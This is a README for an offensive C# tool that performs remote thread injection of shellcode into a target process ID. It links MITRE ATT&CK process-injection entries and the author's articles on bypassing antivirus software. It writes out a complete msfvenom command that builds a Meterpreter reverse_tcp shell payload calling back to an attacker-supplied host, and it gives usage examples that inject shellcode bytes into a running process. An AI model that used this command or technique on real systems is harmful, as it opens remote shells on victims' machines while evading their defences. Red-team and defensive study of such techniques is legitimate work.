# NativePayload_TId
Remote Thread Injection by C# Delegate
-----------------------
Related Links for "Mitre ATT&CK" : 

Process Injection: Portable Executable Injection ==>  https://attack.mitre.org/techniques/T1055/002/

Process Injection: Dynamic-link Library Injection ==> https://attack.mitre.org/techniques/T1055/001/

--------------------------
Your Payload Should be Msfvenom Payload ... 

msfvenom –platform windows –arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=w.x.y.z -f c > payload.txt
-------------------------

    Code1: NativePayload_TId.exe [TPID] [PAYLOAD]

    Code2: NativePayload_TIdnt.exe [TPID] [PAYLOAD]


    EXAMPLE: NativePayload_TId.exe 2452 "FC,48,83,00,..."

    EXAMPLE: NativePayload_TIdnt.exe 2452 "FC,48,83,00,..."
    
------------------------------------------------

Article [1]: https://damonmohammadbagher.github.io/Posts/11Feb2021x.html

Article [2]: https://www.linkedin.com/pulse/bypassing-anti-virus-creating-remote-thread-target-mohammadbagher

step by step => Chapter 14 : C# Delegate & Remote Thread Injection Technique (Part2)

https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/blob/master/CH14/Bypassing%20Anti%20Viruses%20by%20C%23.NET%20Programming%20Chapter%2014%20-Part2.pdf

------------------------------------------------

online eBook, (chapters): https://damonmohammadbagher.github.io/Posts/ebookBypassingAVsByCsharpProgramming/

------------------------------------------------

![](https://github.com/DamonMohammadbagher/NativePayload_TId/blob/main/NativePayload_TIdnt.jpeg)



